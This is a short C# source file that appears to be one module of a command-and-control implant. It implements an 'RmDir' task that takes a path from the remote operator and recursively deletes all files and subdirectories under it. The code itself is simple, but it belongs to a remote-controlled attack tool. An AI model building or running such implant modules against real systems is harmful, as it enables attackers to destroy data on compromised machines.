using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Rmdir : ImplantCommands
    {
        private string targetDir { get; set; }

        public override string Name => "RmDir";

        public override string Execute(ImplantTask task)
        {
            targetDir = task.Args;
            var currentDir = Directory.GetCurrentDirectory();

            if (!(targetDir.Contains(currentDir))) { targetDir = $"{currentDir}\\{task.Args}"; }


            DirectoryInfo dirData = new DirectoryInfo(targetDir);

            foreach(FileInfo cFile in dirData.GetFiles()) { cFile.Delete(); }
            foreach(DirectoryInfo cDir in dirData.GetDirectories()) { cDir.Delete(true); }
            
            Directory.Delete(targetDir, true);

            if (!(dirData.Exists)) { return $"[*] {targetDir} removed\n"; }
            return $"[-] Failed to remove {targetDir}\n";
        }
    }
}